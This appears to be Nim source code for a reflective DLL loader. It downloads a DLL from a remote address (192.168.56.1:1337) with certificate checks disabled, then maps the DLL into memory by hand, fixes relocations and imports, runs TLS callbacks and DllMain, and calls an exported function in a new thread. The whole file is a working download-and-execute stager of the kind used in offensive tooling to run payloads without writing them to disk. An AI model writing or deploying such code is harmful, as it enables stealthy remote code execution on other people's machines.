import winim
import ptr_math
import puppy

type
    PE_HDRS = object
        payloadBytes : seq[byte] # Keep payload alive
        pFileBuffer : ptr BYTE
        dwFileSize : DWORD

        pImgNtHdrs : ptr IMAGE_NT_HEADERS
        pImgSecHdr : ptr IMAGE_SECTION_HEADER

        pEntryImportDataDir : ptr IMAGE_DATA_DIRECTORY
        pEntryBaseRelocDataDir : ptr IMAGE_DATA_DIRECTORY
        pEntryTLSDataDir : ptr IMAGE_DATA_DIRECTORY
        pEntryExceptionDataDir : ptr IMAGE_DATA_DIRECTORY
        pEntryExportDataDir : ptr IMAGE_DATA_DIRECTORY

        bIsDLLFile : BOOL

    IMAGE_BASE_RELOCATION = object
        VirtualAddress : DWORD
        SizeOfBlock : DWORD

    DLLMAIN = proc(hInst: HINSTANCE, reason: DWORD, reserved: LPVOID): BOOL {.stdcall.}

func ToByteSeq(str: string): seq {.inline.} =
    @(str.toOpenArrayByte(0, str.high))

proc InitializePeStruct(pPeHdrs: ptr PE_HDRS, payload: string): bool =
    pPeHdrs.payloadBytes = ToByteSeq(payload)
    if pPeHdrs.payloadBytes.len == 0: return false

    pPeHdrs.pFileBuffer = pPeHdrs.payloadBytes[0].addr
    let dosHeader = cast[PIMAGE_DOS_HEADER](pPeHdrs.pFileBuffer)
    if dosHeader.e_magic != IMAGE_DOS_SIGNATURE: return false

    pPeHdrs.pImgNtHdrs = cast[ptr IMAGE_NT_HEADERS](cast[ULONG_PTR](pPeHdrs.pFileBuffer) + dosHeader.e_lfanew)
    if pPeHdrs.pImgNtHdrs.Signature != IMAGE_NT_SIGNATURE: return false

    pPeHdrs.dwFileSize = pPeHdrs.pImgNtHdrs.OptionalHeader.SizeOfImage
    pPeHdrs.bIsDLLFile = (pPeHdrs.pImgNtHdrs.FileHeader.Characteristics and IMAGE_FILE_DLL) != 0

    pPeHdrs.pImgSecHdr = IMAGE_FIRST_SECTION(pPeHdrs.pImgNtHdrs)
    pPeHdrs.pEntryImportDataDir = &pPeHdrs.pImgNtHdrs.OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT]
    pPeHdrs.pEntryBaseRelocDataDir = &pPeHdrs.pImgNtHdrs.OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC]
    pPeHdrs.pEntryTLSDataDir = &pPeHdrs.pImgNtHdrs.OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_TLS]
    pPeHdrs.pEntryExceptionDataDir = &pPeHdrs.pImgNtHdrs.OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXCEPTION]
    pPeHdrs.pEntryExportDataDir = &pPeHdrs.pImgNtHdrs.OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT]

    return true

proc FixReloc(pEntryBaseRelocDataDir: PIMAGE_DATA_DIRECTORY, pPeBaseAddress: ULONG_PTR, pPreferableAddress: ULONG_PTR): bool =
    if pEntryBaseRelocDataDir.Size == 0: return true

    var pImgBaseRelocation = cast[ptr IMAGE_BASE_RELOCATION](pPeBaseAddress + pEntryBaseRelocDataDir.VirtualAddress)
    let uDeltaOffset = pPeBaseAddress - pPreferableAddress
    if uDeltaOffset == 0: return true

    while pImgBaseRelocation.VirtualAddress != 0:
        let numEntries = (pImgBaseRelocation.SizeOfBlock.int - sizeof(IMAGE_BASE_RELOCATION)) div sizeof(WORD)
        var pBaseRelocEntry = cast[ptr WORD](cast[ULONG_PTR](pImgBaseRelocation) + sizeof(IMAGE_BASE_RELOCATION).ULONG_PTR)

        for i in 0..<numEntries:
            let entry = pBaseRelocEntry[i]
            let relocType = entry shr 12
            let offset = entry and 0x0FFF

            let relocAddr = pPeBaseAddress + pImgBaseRelocation.VirtualAddress.ULONG_PTR + offset.ULONG_PTR
            case relocType
            of IMAGE_REL_BASED_DIR64:
                cast[ptr ULONG_PTR](relocAddr)[] += uDeltaOffset
            of IMAGE_REL_BASED_HIGHLOW:
                cast[ptr DWORD](relocAddr)[] += DWORD(uDeltaOffset)
            of IMAGE_REL_BASED_HIGH:
                cast[ptr WORD](relocAddr)[] += HIWORD(uDeltaOffset)
            of IMAGE_REL_BASED_LOW:
                cast[ptr WORD](relocAddr)[] += LOWORD(uDeltaOffset)
            of IMAGE_REL_BASED_ABSOLUTE:
                continue
            else:
                return false

        pImgBaseRelocation = cast[ptr IMAGE_BASE_RELOCATION](cast[ULONG_PTR](pImgBaseRelocation) + pImgBaseRelocation.SizeOfBlock)

    return true

proc FixImportAddressTable(pPeHdrs: ptr PE_HDRS, modulePtr: PVOID): bool =
    let importsDir = pPeHdrs.pEntryImportDataDir
    if importsDir.Size == 0: return true

    var lib_desc = cast[ptr IMAGE_IMPORT_DESCRIPTOR](cast[ULONG_PTR](modulePtr) + importsDir.VirtualAddress)

    while lib_desc.Name != 0:
        let libname = cast[cstring](cast[ULONG_PTR](modulePtr) + lib_desc.Name)
        let hmodule = LoadLibraryA(libname)
        if hmodule == 0: return false

        let thunkRef = if lib_desc.union1.OriginalFirstThunk != 0: lib_desc.union1.OriginalFirstThunk else: lib_desc.FirstThunk
        var orginThunk = cast[ptr IMAGE_THUNK_DATA](cast[ULONG_PTR](modulePtr) + thunkRef)
        var fieldThunk = cast[ptr IMAGE_THUNK_DATA](cast[ULONG_PTR](modulePtr) + lib_desc.FirstThunk)

        while orginThunk.u1.AddressOfData != 0:
            if (orginThunk.u1.Ordinal and IMAGE_ORDINAL_FLAG64) != 0:
                let ordinal = orginThunk.u1.Ordinal and 0xFFFF
                fieldThunk.u1.Function = cast[ULONGLONG](GetProcAddress(hmodule, cast[LPCSTR](ordinal)))
            else:
                let byname = cast[PIMAGE_IMPORT_BY_NAME](cast[ULONG_PTR](modulePtr) + orginThunk.u1.AddressOfData)
                fieldThunk.u1.Function = cast[ULONGLONG](GetProcAddress(hmodule, cast[LPCSTR](addr byname.Name)))

            if fieldThunk.u1.Function == 0: return false

            orginThunk = cast[ptr IMAGE_THUNK_DATA](cast[ULONG_PTR](orginThunk) + sizeof(IMAGE_THUNK_DATA).ULONG_PTR)
            fieldThunk = cast[ptr IMAGE_THUNK_DATA](cast[ULONG_PTR](fieldThunk) + sizeof(IMAGE_THUNK_DATA).ULONG_PTR)

        lib_desc = cast[ptr IMAGE_IMPORT_DESCRIPTOR](cast[ULONG_PTR](lib_desc) + sizeof(IMAGE_IMPORT_DESCRIPTOR).ULONG_PTR)

    return true

proc FixMemPermissions(pPeBaseAddress: ULONG_PTR, pImgNtHdrs: PIMAGE_NT_HEADERS, pImgSecHdr: PIMAGE_SECTION_HEADER): bool =
    for i in 0..<pImgNtHdrs.FileHeader.NumberOfSections.int:
        if pImgSecHdr[i].SizeOfRawData == 0 or pImgSecHdr[i].VirtualAddress == 0:
            continue

        var dwProtection: DWORD
        let characteristics = pImgSecHdr[i].Characteristics

        if (characteristics and IMAGE_SCN_MEM_EXECUTE) != 0:
            if (characteristics and IMAGE_SCN_MEM_WRITE) != 0:
                if (characteristics and IMAGE_SCN_MEM_READ) != 0:
                    dwProtection = PAGE_EXECUTE_READWRITE
                else: dwProtection = PAGE_EXECUTE_WRITECOPY
            elif (characteristics and IMAGE_SCN_MEM_READ) != 0:
                dwProtection = PAGE_EXECUTE_READ
            else: dwProtection = PAGE_EXECUTE
        elif (characteristics and IMAGE_SCN_MEM_WRITE) != 0:
            dwProtection = PAGE_READWRITE
        elif (characteristics and IMAGE_SCN_MEM_READ) != 0:
            dwProtection = PAGE_READONLY
        else: dwProtection = PAGE_NOACCESS

        var dwOldProtection: DWORD
        if VirtualProtect(cast[LPVOID](pPeBaseAddress + pImgSecHdr[i].VirtualAddress),
                          pImgSecHdr[i].SizeOfRawData, dwProtection, &dwOldProtection) == 0:
            return false

    return true

proc SetExceptionHandlers(pPeHdrs: ptr PE_HDRS, pPeBaseAddress: LPVOID): bool =
    if pPeHdrs.pEntryExceptionDataDir.Size != 0:
        var pImgRuntimeFuncEntry = cast[PRUNTIME_FUNCTION](cast[ULONG_PTR](pPeBaseAddress) + pPeHdrs.pEntryExceptionDataDir.VirtualAddress)
        if RtlAddFunctionTable(pImgRuntimeFuncEntry,
                               pPeHdrs.pEntryExceptionDataDir.Size div sizeof(RUNTIME_FUNCTION).DWORD,
                               cast[ULONG_PTR](pPeBaseAddress)) == FALSE:
            return false
    return true

proc ExecTLSCallbacks(pPeHdrs: ptr PE_HDRS, baseAddress: PVOID): bool =
    if pPeHdrs.pEntryTLSDataDir.Size == 0: return true

    let pImgTlsDirectory = cast[PIMAGE_TLS_DIRECTORY](cast[ULONG_PTR](baseAddress) + pPeHdrs.pEntryTLSDataDir.VirtualAddress)
    var pImgTlsCallback = cast[ptr PVOID](pImgTlsDirectory.AddressOfCallBacks)

    while pImgTlsCallback[] != nil:
        type TlsCallback = proc(hinstDLL: HINSTANCE, fdwReason: DWORD, lpvReserved: LPVOID) {.stdcall.}
        let callback = cast[TlsCallback](pImgTlsCallback[])
        try:
            callback(cast[HINSTANCE](baseAddress), DLL_PROCESS_ATTACH, nil)
        except:
            return false
        pImgTlsCallback = cast[ptr PVOID](cast[ULONG_PTR](pImgTlsCallback) + sizeof(PVOID).ULONG_PTR)

    return true

proc FetchExportedFunctionAddress(pEntryExportDataDir: PIMAGE_DATA_DIRECTORY, pPeBaseAddress: ULONG_PTR, cFuncName: LPCSTR): PVOID =
    if pEntryExportDataDir.Size == 0: return nil

    let pImgExportDir = cast[PIMAGE_EXPORT_DIRECTORY](pPeBaseAddress + pEntryExportDataDir.VirtualAddress)
    let functionNameArray = cast[ptr UncheckedArray[DWORD]](pPeBaseAddress + pImgExportDir.AddressOfNames)
    let functionAddressArray = cast[ptr UncheckedArray[DWORD]](pPeBaseAddress + pImgExportDir.AddressOfFunctions)
    let functionOrdinalArray = cast[ptr UncheckedArray[WORD]](pPeBaseAddress + pImgExportDir.AddressOfNameOrdinals)

    for i in 0..<pImgExportDir.NumberOfNames:
        let functionName = cast[cstring](pPeBaseAddress + functionNameArray[i])
        if functionName == cast[cstring](cFuncName):
            let ordinalIdx = functionOrdinalArray[i]
            let functionRVA = functionAddressArray[ordinalIdx]
            return cast[PVOID](pPeBaseAddress + functionRVA)

    return nil

proc LocalReflectiveDllExec(pPeHdrs: ptr PE_HDRS, cExportedFuncName: string = ""): string =
    var pPeBaseAddress = VirtualAlloc(cast[LPVOID](pPeHdrs.pImgNtHdrs.OptionalHeader.ImageBase),
                                     pPeHdrs.pImgNtHdrs.OptionalHeader.SizeOfImage,
                                     MEM_RESERVE or MEM_COMMIT, PAGE_READWRITE)
    if pPeBaseAddress == nil:
        pPeBaseAddress = VirtualAlloc(nil, pPeHdrs.pImgNtHdrs.OptionalHeader.SizeOfImage,
                                     MEM_RESERVE or MEM_COMMIT, PAGE_READWRITE)
    if pPeBaseAddress == nil:
        return "\n[-] Failed to allocate memory : " & $GetLastError()

    copymem(pPeBaseAddress, pPeHdrs.pFileBuffer, pPeHdrs.pImgNtHdrs.OptionalHeader.SizeOfHeaders)

    for i in 0..<pPeHdrs.pImgNtHdrs.FileHeader.NumberOfSections.int:
        let dest = cast[LPVOID](cast[ULONG_PTR](pPeBaseAddress) + pPeHdrs.pImgSecHdr[i].VirtualAddress)
        let source = cast[LPVOID](cast[ULONG_PTR](pPeHdrs.pFileBuffer) + pPeHdrs.pImgSecHdr[i].PointerToRawData)
        copymem(dest, source, pPeHdrs.pImgSecHdr[i].SizeOfRawData)
    result.add("\n[+] DLL Sections copied")

    if cast[ULONG_PTR](pPeBaseAddress) != pPeHdrs.pImgNtHdrs.OptionalHeader.ImageBase:
        if not FixReloc(pPeHdrs.pEntryBaseRelocDataDir, cast[ULONG_PTR](pPeBaseAddress), pPeHdrs.pImgNtHdrs.OptionalHeader.ImageBase):
            result.add("\n[-] Failed to fix relocation : " & $GetLastError())
        else:
            result.add("\n[+] Relocation fixed")

    if not FixImportAddressTable(pPeHdrs, pPeBaseAddress):
        result.add("\n[-] Failed to fix IAT : " & $GetLastError())
        discard VirtualFree(pPeBaseAddress, 0, MEM_RELEASE)
        return
    result.add("\n[+] IAT fixed")

    if not FixMemPermissions(cast[ULONG_PTR](pPeBaseAddress), pPeHdrs.pImgNtHdrs, pPeHdrs.pImgSecHdr):
        result.add("\n[-] Failed to fix memory permission : " & $GetLastError())
        discard VirtualFree(pPeBaseAddress, 0, MEM_RELEASE)
        return
    result.add("\n[+] Memory permissions fixed")

    if not SetExceptionHandlers(pPeHdrs, pPeBaseAddress):
        result.add("\n[-] Failed to set Exception Handlers : " & $GetLastError())
    else:
        result.add("\n[+] Exception Handlers fixed")

    if not ExecTLSCallbacks(pPeHdrs, pPeBaseAddress):
        result.add("\n[-] TLS Callback failed : " & $GetLastError())
    else:
        result.add("\n[+] TLS Callback executed! (if exists)")

    let pEntryPoint = cast[PVOID](cast[ULONG_PTR](pPeBaseAddress) + pPeHdrs.pImgNtHdrs.OptionalHeader.AddressOfEntryPoint)
    var pExportedFuncAddress: PVOID = nil

    if pPeHdrs.pEntryExportDataDir.Size != 0 and cExportedFuncName.len > 0:
        pExportedFuncAddress = FetchExportedFunctionAddress(pPeHdrs.pEntryExportDataDir, cast[ULONG_PTR](pPeBaseAddress), cExportedFuncName.cstring)
        if pExportedFuncAddress != nil:
            result.add("\n[+] Exported function fetched!")
        else:
            result.add("\n[-] Failed to fetch exported function")

    result.add("\n\n[+] DLL base address : " & pPeBaseAddress.repr)
    if cExportedFuncName.len > 0:
        result.add("\n[+] Exported function : " & cExportedFuncName)
    result.add("\n[+] DLL size : " & $pPeHdrs.dwFileSize)
    result.add("\n[+] Entry point address : " & pEntryPoint.repr)
    if cExportedFuncName.len > 0:
        result.add("\n[+] Exported function address : " & pExportedFuncAddress.repr)

    let pDllMain = cast[DLLMAIN](pEntryPoint)
    if pDllMain(cast[HINSTANCE](pPeBaseAddress), DLL_PROCESS_ATTACH, nil) == FALSE:
        result.add("\n[-] DllMain returned FALSE")
    else:
        result.add("\n[+] DLL executed!")

    if pExportedFuncAddress != nil:
        let hThread = CreateThread(nil, 0, cast[LPTHREAD_START_ROUTINE](pExportedFuncAddress), nil, 0, nil)
        if hThread == 0:
            result.add("\n[-] Failed to create thread: " & $GetLastError())
        else:
            WaitForSingleObject(hThread, INFINITE)
            CloseHandle(hThread)
            result.add("\n[+] Exported function thread finished")

    if VirtualFree(pPeBaseAddress, 0, MEM_RELEASE) == 0:
        result.add("\n\n[-] Failed to free allocation :" & $GetLastError())
    else:
        result.add("\n\n[+] Allocation freed")

proc GetRemoteDll(url: string, exportedFunction: string = ""): string =
    var req = Request(
        url: parseUrl(url),
        verb: "get",
        allowAnyHttpsCertificate: true
    )

    try:
        let res = fetch(req)
        var peHdrs: PE_HDRS
        if not InitializePeStruct(addr peHdrs, res.body):
            return "[-] Failed to initialize DLL structure"

        result.add("[+] DLL structure initialized")
        result.add(LocalReflectiveDllExec(addr peHdrs, exportedFunction))
    except:
        return "[-] Failed to get dll: " & getCurrentExceptionMsg()

when isMainModule:
    let url = "http://192.168.56.1:1337/mydll.dll"
    let exportedFunction = "NimMain"
    echo GetRemoteDll(url, exportedFunction)
